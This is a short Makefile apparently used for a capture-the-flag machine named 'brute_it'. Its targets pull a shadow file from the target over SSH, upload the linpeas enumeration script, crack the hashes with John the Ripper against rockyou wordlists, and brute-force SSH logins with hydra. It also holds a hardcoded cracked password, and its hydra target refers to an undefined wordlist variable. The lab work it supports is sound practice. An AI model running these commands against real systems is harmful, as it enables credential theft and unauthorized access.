USERNAME=john
PASSWORD_LIST="/usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt"
PASSWORD_LIST="rockyou.txt"
PASSWORD="rockinroll"
TARGET_IP=$(shell cat ip.txt)

get_file:
	scp -i id_rsa $(USERNAME)@$(TARGET_IP):./brute_it/shadow ~/brute_it/shadow

send_file:
	scp -i id_rsa linpeas.sh $(USERNAME)@$(TARGET_IP):./

john:
	john --wordlist=$(PASSWORD_LIST) shadow

ssh:
	ssh -i id_rsa $(USERNAME)@$(TARGET_IP)

brute_ssh:
	hydra -l $(USERNAME) -P $(WORDLIST) ssh://$(TARGET_IP)
